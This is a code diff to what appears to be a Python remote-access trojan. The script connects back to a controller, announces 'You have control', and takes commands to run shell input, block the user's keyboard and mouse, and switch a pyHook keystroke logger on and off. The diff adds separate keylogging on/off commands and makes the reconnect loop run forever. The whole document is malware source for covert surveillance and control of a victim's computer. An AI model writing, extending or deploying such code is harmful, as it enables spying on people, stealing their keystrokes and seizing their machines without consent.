@@ -5,6 +5,7 @@ import pyHook
 import socket
 import subprocess
 import sys
+import thread
 import time
 
 HOST = '127.0.0.1'   
@@ -55,8 +56,10 @@ def run_shell_cmd(socketHolder):
 		if data == "exit":
 			socketHolder.close()
 			sys.exit(0)
-                elif data == 'logKeys':
-                     manageLoggedKeys()
+                elif data == 'logKeysOn':
+                    manageLoggedKeys()
+                elif data == 'logKeysOff':
+                    pump = False
                 elif data == 'blockInput':
                         blockInput()
                 elif len(data) == 0:
@@ -73,17 +76,15 @@ def run_shell_cmd(socketHolder):
 		socketHolder = connect((HOST,PORT))
 
 def main():
-	socketAlive = True
-        while socketAlive:
-		dataReceived = True
-                try:
-                        socketHolder = connect((HOST,PORT))
-			socketHolder.send('You have control')
-                        while dataReceived:
-				commandsFromMaster = run_shell_cmd(socketHolder)
-                        socketHolder.close()
-                except socket.error:
-                        pass
+    while True:
+            try:
+                socketHolder = connect((HOST,PORT))
+                socketHolder.send('You have control')
+                while True:
+                    commandsFromMaster = run_shell_cmd(socketHolder)
+                socketHolder.close()
+            except socket.error:
+                pass
 
 if __name__ == "__main__":
         sys.exit(main())
